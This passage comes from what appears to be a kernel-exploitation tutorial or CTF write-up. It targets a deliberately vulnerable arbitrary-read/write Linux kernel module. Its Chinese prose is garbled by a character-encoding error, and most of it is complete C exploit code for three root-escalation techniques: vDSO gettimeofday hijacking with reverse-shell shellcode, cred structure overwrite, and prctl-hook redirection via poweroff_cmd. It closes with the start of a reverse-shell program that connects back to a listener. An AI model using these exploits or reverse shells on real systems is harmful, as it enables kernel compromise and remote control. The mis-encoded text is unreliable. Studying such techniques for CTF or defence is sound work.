name_addr - vdso_addr;\n}\n```\n\nä¹‹åå¾—åˆ°å…·ä½“çš„åœ°å€\n\n![image-20211020150723942](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150724.png)\n\né‚£ä¹ˆæœ€ç»ˆçš„gettimeofdayç›¸å¯¹äºvmlinuxåŸºåœ°å€å°±æ˜¯\n\n```\ngettimeofday_addr = 0xffffffff81e04b20+0xb20\n```\n\n#### (3)ä»»æ„å†™åŠ«æŒgettimeofday\n\næœ€ç»ˆåˆ©ç”¨ä»»æ„å†™ï¼Œå°†gettimeofdayå‡½æ•°çš„å†…å®¹æ”¹ä¸ºæˆ‘ä»¬çš„shellcodeå³å¯\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n// ffffffff810a78d0 T SyS_gettimeofday\n// ffffffff810a78d0 T sys_gettimeofday\n// ffffffff810b08f0 T do_gettimeofday\n// ffffffff810c7350 T compat_SyS_gettimeofday\n// ffffffff810c7350 T compat_sys_gettimeofday\n//0x13d\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n#define GETTIMEOFDAY_FUN 0xB20\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n//ç”¨äºåå¼¹shellçš„shellcodeï¼Œ127.0.0.1:3333\n//æˆ–è€…åœ¨æ¯”èµ›ä¸­å¯ä»¥ç›´æ¥å†™ç±»ä¼¼Orwæ‰“å¼€flagçš„shellcode\nchar shellcode[]=\"\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\";\n\n\n//open dev\nint openDev(char* pos);\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    pthread_t thread;\n    \n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n\n\n   char *buf = (char *)calloc(1,0x1000);\n\n\n   int gettimeofday_str_offset = get_gettimeofday_str_offset();\n   printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n   size_t vdso_addr = -1;\n   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n      //è¯»å–ä¸€é¡µæ•°æ®\n      arbitrary_read(devFD,0x1000,buf,addr);\n      //å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€\n      //ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ\n      if (!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n         printf(\"[+]find vdso.so!!\\n\");\n         vdso_addr = addr;\n         printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n         break;\n      }\n   }\n   if (vdso_addr == -1) {\n      printf(\"[-]can't find vdso.so!!\\n\");\n   }\n   size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;\n   printf(\"[+]gettimeofday function in kernel addr=0x%lx\\n\",gettimeofday_addr);\n   //å°†gettimeofdayå¤„å†™å…¥æˆ‘ä»¬çš„shellcodeï¼Œå› ä¸ºå†™æ“ä½œåœ¨å†…æ ¸é©±åŠ¨é‡Œå®Œæˆï¼Œå†…æ ¸å¯ä»¥è¯»å†™æ‰§è¡Œvdso\n   //ç”¨æˆ·åªèƒ½è¯»å’Œæ‰§è¡Œvdso\n   arbitrary_write(devFD,strlen(shellcode),shellcode,gettimeofday_addr);\n   sleep(1);\n   printf(\"[+]open a shell\\n\");\n   system(\"nc -lvnp 3333\");\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²\"gettimeofday\"ç›¸å¯¹vdso.soçš„åç§»\nint get_gettimeofday_str_offset() {\n   //è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx\n   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n   char* name = \"gettimeofday\";\n   if (!vdso_addr) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   //ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000\n   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n   if (name_addr < 0) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   return name_addr - vdso_addr;\n}\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n```\n\nå‚è€ƒï¼š\n\n[(15æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹åŠ«æŒvdso_seaaseesaçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/seaaseesa/article/details/104694219?ops_request_misc=%7B%22request%5Fid%22%3A%22163469082516780357227209%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163469082516780357227209&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-7-104694219.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)\n\nè¿˜æœ‰bsauceå¸ˆå‚…çš„ç®€ä¹¦ï¼šhttps://www.jianshu.com/p/07994f8b2bb0\n\n### 2.åŠ«æŒcredç»“æ„ä½“\n\n#### (1)å‰ç½®çŸ¥è¯†\n\nè¿™ä¸ªæ²¡å•¥å¥½è®²çš„ï¼Œå°±æ˜¯è¦†ç›–uigå’Œgidä¸ºé›¶è›‹å°±è¡Œï¼Œå”¯ä¸€éœ€è¦çš„å°±æ˜¯å¯»æ‰¾credçš„åœ°å€ã€‚\n\n\n\n#### (2)å¯»æ‰¾åœ°å€\n\n##### â‘ åˆ©ç”¨prctlå‡½æ•°\n\ntask_srtuctç»“æ„ä½“æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåˆ›å»ºçš„ä¸€ä¸ªç»“æ„ä½“ï¼Œä¿å­˜å½“å‰è¿›ç¨‹çš„å¾ˆå¤šå†…å®¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬å½“å‰è¿›ç¨‹çš„credç»“æ„ä½“æŒ‡é’ˆã€‚\n\n```c\n//version 4.4.72\n\nstruct task_struct {\n    //............................................\n/* process credentials */\n\tconst struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */\n\tconst struct cred __rcu *real_cred; /* objective and real subjective task\n\t\t\t\t\t * credentials (COW) */\n\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\n\t\t\t\t\t * credentials (COW) */\n\tchar comm[TASK_COMM_LEN]; /* executable name excluding path\n\t\t\t\t     - access with [gs]et_task_comm (which lock\n\t\t\t\t       it with task_lock())\n\t\t\t\t     - initialized normally by setup_new_exec */\n\t//............................................\n}\n```\n\nç»™å‡ºçš„é¢˜ç›®ç¼–è¯‘åœ¨4.4.72å†…æ ¸ä¸‹ã€‚\n\nä¹Ÿå°±æ˜¯å¯ä»¥å°†comm[TASK_COMM_LEN]è®¾ç½®ä¸ºæŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰“ä¸ªæ ‡è®°ï¼Œä¸è¿‡ä¸åŒç‰ˆæœ¬ä¸­å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä¸å¦‚æœ€æ–°ç‰ˆæœ¬V5.14.13çš„Linuxå†…æ ¸å°±æœ‰æ‰€ä¸åŒï¼Œå…¶ä¸­è¿˜åŠ äº†ä¸€ä¸ªkeyç»“æ„ä½“æŒ‡é’ˆï¼š\n\n```c\n//version 5.14.13\n\nstruct task_struct {\n    //............................................\n#ifdef CONFIG_THREAD_INFO_IN_TASK\n\t/*\n\t * For reasons of header soup (see current_thread_info()), this\n\t * must be the first element of task_struct.\n\t */\n\tstru/* Tracer's credentials at attach: */\n\tconst struct cred __rcu\t\t*ptracer_cred;\n\n\t/* Objective and real subjective task credentials (COW): */\n\tconst struct cred __rcu\t\t*real_cred;\n\t\n\t/* Effective (overridable) subjective task credentials (COW): */\n\tconst struct cred __rcu\t\t*cred;\n\n#ifdef CONFIG_KEYS\n\t/* Cached requested key. */\n\tstruct key\t\t\t*cached_requested_key;\n#endif\n\n\t/*\n\t * executable name, excluding path.\n\t *\n\t * - normally initialized setup_new_exec()\n\t * - access it with [gs]et_task_comm()\n\t * - lock it with task_lock()\n\t */\n\tchar\t\t\t\tcomm[TASK_COMM_LEN];\n\t//............................................\n\n}\n```\n\nç„¶åå°±å¯ä»¥åˆ©ç”¨prctlå‡½æ•°çš„PR_SET_NAMEåŠŸèƒ½æ¥è®¾ç½®task_structç»“æ„ä½“ä¸­çš„comm[TASK_COMM_LEN]æˆå‘˜ã€‚\n\n```c\nchar target[16];\nstrcpy(target,\"tryToFindPIG007\");\nprctl(PR_SET_NAME,target);\n```\n\n##### â‘¡å†…å­˜æœç´¢å®šä½\n\né€šè¿‡å†…å­˜æœç´¢ï¼Œæ¯”å¯¹æˆ‘ä»¬è¾“å…¥çš„æ ‡è®°å­—ç¬¦ä¸²ï¼Œå¯ä»¥å®šä½comm[TASK_COMM_LEN]æˆå‘˜åœ°å€ï¼Œæ¯”å¦‚è®¾ç½®æ ‡è®°å­—ç¬¦ä¸²ä¸º\"tryToFindPIG007\":\n\n![image-20211020162844474](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162844.png)\n\n![image-20211020162934065](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162934.png)\n\n![image-20211020163051697](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163051.png)\n\nå¯ä»¥æŸ¥çœ‹å½“å‰Credç»“æ„ä¸­çš„å†…å®¹ï¼š\n\n![image-20211020163136129](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163136.png)\n\n```c\n//search target chr\nchar *buf = (char *)calloc(1,0x1000);\nputs(\"[+] we can read and write any memory\");\nfor(;addr<0xffffc80000000000;addr+=0x1000){\n    arbitrary_read(devFD,0x1000,buf,addr);\n    result=memmem(buf,0x1000,target,16);\n    if (result){\n        printf(\"result:%p\\n\",result);\n        cred= * (size_t *)(result-0x8);\n        real_cred= *(size_t *)(result-0x10);\n        // if ((cred||0xff00000000000000) && (real_cred == cred))\n        // {\n        target_addr=addr+result-(int)(buf);\n        printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n        printf(\"[+]found cred 0x%lx\\n\",real_cred);\n        break;\n        // }\n    }\n}\n```\n\n##### â‘¢ä»»æ„å†™åŠ«æŒcred\n\nè¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œè·å–åˆ°credåœ°å€ä¹‹åç›´æ¥å†™å°±è¡Œäº†\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n\n//open dev\nint openDev(char* pos);\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    size_t addr=0xffff880000000000;\n    size_t cred=0;\n    size_t real_cred=0;\n    size_t target_addr;\n    size_t result=0;\n    char root_cred[28] = {0};\n\n    //set comm[TASK_COMM_LEN]\n    char target[16];\n    strcpy(target,\"tryToFindPIG007\");\n    prctl(PR_SET_NAME,target);\n\n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n    //search target chr\n    char *buf = (char *)calloc(1,0x1000);\n    puts(\"[+] we can read and write any memory\");\n    for(;addr<0xffffc80000000000;addr+=0x1000){\n        arbitrary_read(devFD,0x1000,buf,addr);\n        result=memmem(buf,0x1000,target,16);\n        if (result){\n            printf(\"result:%p\\n\",result);\n            cred= * (size_t *)(result-0x8);\n            real_cred= *(size_t *)(result-0x10);\n            // if ((cred||0xff00000000000000) && (real_cred == cred))\n            // {\n            target_addr=addr+result-(int)(buf);\n            printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n            printf(\"[+]found cred 0x%lx\\n\",real_cred);\n            break;\n            // }\n        }\n    }\n    if (result==0)\n    {\n        puts(\"not found , try again \");\n        exit(-1);\n    }\n\n    arbitrary_write(devFD,28,root_cred,real_cred);\n\n    if (getuid()==0){\n        printf(\"[+]now you are r00t,enjoy ur shell\\n\");\n        system(\"/bin/sh\");\n    }\n    else\n    {\n        puts(\"[-] there must be something error ... \");\n        exit(-1);\n    }\n\n\n\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n\n```\n\n#### â–²æ³¨æ„äº‹é¡¹\n\nä¸è¿‡è¿™ä¸ªå¦‚æœä¸åŠ åˆ¤æ–­ `if ((cred||0xff00000000000000) && (real_cred == cred))`æœç´¢å‡ºæ¥çš„credå¯èƒ½å°±ä¸æ˜¯å½“å‰è¿›ç¨‹ï¼Œå…·æœ‰ä¸€å®šæ¦‚ç‡æ€§ï¼Œå…·ä½“åŸå› ä¸çŸ¥ï¼Œå¯èƒ½æ˜¯æœç´¢åˆ°äº†ç”¨æˆ·è¿›ç¨‹ä¸‹çš„å­—ç¬¦ä¸²ï¼Ÿ\n\n![image-20211020165201267](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020165201.png)\n\n\n\n### 3.åŠ«æŒprctlå‡½æ•°\n\n#### (1)å‡½æ•°è°ƒç”¨é“¾\n\n`prctl`->`security_task_prctl`->`*prctl_hook`\n\n\n\n`orderly_poweroff`->`__orderly_poweroff`->`run_cmd(poweroff_cmd)`-> `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)`\n\n#### (2)å‰ç½®çŸ¥è¯†\n\n![image-20211021000903293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021000904.png)\n\nåŸæœ¬capability_hooks+440å­˜æ”¾çš„æ˜¯cap_task_prctlçš„åœ°å€\n\n![image-20211021001258001](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001258.png)\n\nä½†æ˜¯ç»è¿‡æˆ‘ä»¬çš„åŠ«æŒä¹‹åå­˜æ”¾çš„æ˜¯orderly_poweroffçš„åœ°å€\n\n![image-20211021001355490](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001355.png)\n\nä¹‹å‰è®²çš„prctl_hookæŒ‡çš„å°±æ˜¯capability_hooks+440ã€‚\n\nè¿™æ ·åŠ«æŒä¹‹åæˆ‘ä»¬å°±èƒ½è°ƒç”¨åˆ°orderly_poweroffå‡½æ•°äº†ã€‚\n\nè€Œorderly_poweroffå‡½æ•°ä¸­ä¼šè°ƒç”¨å®é™…__orderly_poweroffå‡½æ•°ï¼Œæœ‰å¦‚ä¸‹ä»£ç \n\n```c\n//version 4.4.72\nstatic int __orderly_poweroff(bool force)\n{\n\tint ret;\n\n\tret = run_cmd(poweroff_cmd);\n\n\tif (ret && force) {\n\t\tpr_warn(\"Failed to start orderly shutdown: forcing the issue\\n\");\n\n\t\t/*\n\t\t * I guess this should try to kick off some daemon to sync and\n\t\t * poweroff asap.  Or not even bother syncing if we're doing an\n\t\t * emergency shutdown?\n\t\t */\n\t\temergency_sync();\n\t\tkernel_power_off();\n\t}\n\n\treturn ret;\n}\n```\n\nè¿™é‡Œå°±è°ƒç”¨åˆ°run_cmd(poweroff_cmd)ï¼Œè€Œrun_cmdå‡½æ•°æœ‰å¦‚ä¸‹ä»£ç \n\n```c\n//version 4.4.72\nstatic int run_cmd(const char *cmd)\n{\n\tchar **argv;\n\tstatic char *envp[] = {\n\t\t\"HOME=/\",\n\t\t\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\",\n\t\tNULL\n\t};\n\tint ret;\n\targv = argv_split(GFP_KERNEL, cmd, NULL);\n\tif (argv) {\n\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n\t\targv_free(argv);\n\t} else {\n\t\tret = -ENOMEM;\n\t}\n\n\treturn ret;\n}\n```\n\nè¿™é‡Œå°±è°ƒç”¨åˆ°call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)ï¼Œè¿™é‡Œçš„å‚æ•°rdiä¸­å°±æ˜¯\n\npoweroff_cmdã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥åŠ«æŒpoweroff_cmdä¸ºæˆ‘ä»¬çš„ç¨‹åºåå­—å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨call_usermodehelpeå‡½æ•°æ¥å¯åŠ¨æˆ‘ä»¬çš„ç¨‹åºã€‚è€Œpoweroff_cmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–åœ°å€è¿›è¡Œä¿®æ”¹ã€‚\n\n![image-20211021002640262](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021002640.png)\n\nè€Œcall_usermodehelpeå‡½æ•°å¯åŠ¨ç¨‹åºæ—¶æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬çš„ç¨‹åºè¿è¡Œ/bin/shä¸”ä»¥rootæƒé™å¯åŠ¨ï¼Œé‚£ä¹ˆå°±å®Œæˆäº†ææƒã€‚\n\n#### (3)è·å–åœ°å€\n\n##### â‘ prctl_hook\n\nå¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªå°ç¨‹åºï¼Œç„¶åç»™`security_task_prctl`å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°`call QWORD PTR[rbx+0x18]`å³å¯çœ‹åˆ°å¯¹åº”çš„rbx+0x18ä¸Šå­˜æ”¾çš„åœ°å€ï¼Œå°†å…¶ä¿®æ”¹ä¸º`orderly_poweroff`å‡½æ•°å³å¯ã€‚\n\n##### â‘¡poweroff_cmdã€orderly_poweroff\n\nå¯ä»¥ç›´æ¥ä½¿ç”¨nmå‘½ä»¤æ¥è·å–ï¼Œæˆ–è€…ç›´æ¥è¿›å…¥gdbæ‰“å°å³å¯ã€‚\n\n![image-20211021105456058](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105503.png)\n\næ­¤å¤–orderly_poweroffä¹Ÿæ˜¯ä¸€æ ·çš„è·å–ã€‚å¦‚æœæ— æ³•æŸ¥åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥å¯åŠ¨qemuï¼Œå…ˆè®¾ç½®ä¸ºrootæƒé™å\n\n`cat /proc/kallsyms | grep \"orderly_poweroff\"`å³å¯ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡ŒæŸ¥è¯¢ã€‚\n\n![image-20211021105603666](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105603.png)\n\nâ–²æœ€åforkä¸€ä¸ªå­è¿›ç¨‹æ¥è§¦å‘åå¼¹shellå³å¯\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n\n//ffffffff812adb90 T security_task_prctl\n\n\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\n//poweroffå­—ç¬¦ä¸²çš„åç§»\n#define POWEROFF_CMD 0xe39c40\n//orderly_poweroffå‡½æ•°çš„åç§»\n#define ORDERLY_POWEROFF 0x070060\n//prctl_hookçš„åç§»\n#define PRCTL_HOOK 0xe7c7d8;\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n//open dev\nint openDev(char* pos);\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    \n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n\n    // //set comm[TASK_COMM_LEN]\n    // char target[16];\n    // strcpy(target,\"tryToFindPIG007\");\n    // prctl(PR_SET_NAME,target);\n\n\n   char *buf = (char *)calloc(1,0x1000);\n\n\n   int gettimeofday_str_offset = get_gettimeofday_str_offset();\n   printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n   size_t vdso_addr = -1;\n   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n      //è¯»å–ä¸€é¡µæ•°æ®\n      arbitrary_read(devFD,0x1000,buf,addr);\n      //å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€\n      //ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ\n      if (!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n         printf(\"[+]find vdso.so!!\\n\");\n         vdso_addr = addr;\n         printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n         break;\n      }\n   }\n   if (vdso_addr == -1) {\n      printf(\"[-]can't find vdso.so!!\\n\");\n   }\n\n    //è®¡ç®—å‡ºkernelåŸºåœ°å€\n    size_t kernel_base = vdso_addr & 0xffffffffff000000;\n    printf(\"[+]kernel_base=0x%lx\\n\",kernel_base);\n    size_t poweroff_cmd_addr = kernel_base + POWEROFF_CMD;\n    printf(\"[+]poweroff_cmd_addr=0x%lx\\n\",poweroff_cmd_addr);\n    size_t orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;\n    printf(\"[+]orderly_poweroff_addr=0x%lx\\n\",orderly_poweroff_addr);\n    size_t prctl_hook_addr = kernel_base + PRCTL_HOOK;\n    printf(\"[+]prctl_hook_addr=0x%lx\\n\",prctl_hook_addr);\n    //åå¼¹shellï¼Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”±call_usermodehelperæ¥æ‰§è¡Œï¼Œè‡ªå¸¦root\n    char reverse_command[] = \"/reverse_shell\";\n    //ä¿®æ”¹poweroff_cmd_addrå¤„çš„å­—ç¬¦ä¸²ä¸ºæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„\n    arbitrary_write(devFD,strlen(reverse_command),reverse_command,poweroff_cmd_addr);\n    //hijack prctlï¼Œä½¿å¾—task_prctlæŒ‡å‘orderly_poweroffå‡½æ•°\n    arbitrary_write(devFD,0x8,&orderly_poweroff_addr,prctl_hook_addr);\n    if (fork() == 0) { //forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥è§¦å‘shellçš„åå¼¹\n        prctl(0,0);\n        exit(-1);\n    } else {\n        printf(\"[+]open a shell\\n\");\n        system(\"nc -lvnp 7777\");\n    }\n\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²\"gettimeofday\"ç›¸å¯¹vdso.soçš„åç§»\nint get_gettimeofday_str_offset() {\n   //è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx\n   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n   char* name = \"gettimeofday\";\n   if (!vdso_addr) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   //ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000\n   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n   if (name_addr < 0) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   return name_addr - vdso_addr;\n}\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n```\n\n#### åå¼¹Shell\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <netdb.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n\nint main(int argc,char *argv[])\n{\n    //system(\"chmod 777 /flag\");\n    \n\n    int sockfd,numbytes;\n    char buf[BUFSIZ];\n    struct sockaddr_in their_addr;\n    printf(\"break!\");\n    while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1);\n    printf(\"We get the sockfd~\\n\");\n    their_addr.sin_family = AF_INET;\n    their_addr.sin_port = htons(7777);\n    their_addr.sin_addr.s_addr=inet_addr(\"127.0.0.1\");\n    bzero(&(their_addr.sin_zero), 8);\n    \n    while(connect(sockfd,(struct sockaddr*)&their_addr,sizeof(struct sockaddr)) == -1);\n    dup2(sockfd,0);\n    dup2(sockfd,1);\n    dup2(sockfd,2);\n    